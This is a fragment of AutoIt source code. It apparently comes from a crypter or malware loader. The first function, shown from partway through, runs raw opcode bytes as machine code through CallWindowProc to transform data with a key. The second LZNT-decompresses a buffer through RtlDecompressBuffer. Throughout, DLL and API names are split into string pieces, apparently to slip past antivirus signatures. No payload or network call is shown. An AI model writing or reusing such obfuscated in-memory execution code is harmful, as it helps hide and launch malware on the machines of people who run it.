	Local $sBuffer = DllStructCreate("by" & "te[" & BinaryLen($sOpcode) & "]")
	DllStructSetData($sBuffer, 1, $sOpcode)
	Local $Buffer = DllStructCreate("by" & "te[" & BinaryLen($Data) & "]")
	DllStructSetData($Buffer, 1, $Data)
	DllCall("user" & "32.dll", "none", "CallWin" & "dowProc", "ptr", DllStructGetPtr($sBuffer), "ptr", DllStructGetPtr($Buffer), "int", BinaryLen($Data), "str", $Key, "int", 0)
	Local $Ret = DllStructGetData($Buffer, 1)
	$Buffer = 0
	$sBuffer = 0
	Return $Ret
EndFunc

Func _LZNTDecompress($sBinary)
    $sBinary = Binary($sBinary)
	$sBinarylen = BinaryLen($sBinary)
    Local $sWriteData = DllStructCreate("by" & "te[" & $sBinarylen & "]")
	DllStructSetData($sWriteData, 1, $sBinary)
    Local $sBufferPtr = DllStructCreate("by" & "te[" & 16 * DllStructGetSize($sWriteData) & "]")
    Local $sCallDecompress = DllCall("nt" & "dll.dll", "int", "Rt" & "lDecompr" & "essBuffer", "ushort", 258, "ptr", DllStructGetPtr($sBufferPtr), "dword", DllStructGetSize($sBufferPtr), "ptr", DllStructGetPtr($sWriteData), _
            "dword", DllStructGetSize($sWriteData), _
            "dword*", 0)
    Local $sDecompressed = DllStructCreate("by" & "te[" & $sCallDecompress[6] & "]", DllStructGetPtr($sBufferPtr))
    Return  DllStructGetData($sDecompressed, 1)
EndFunc




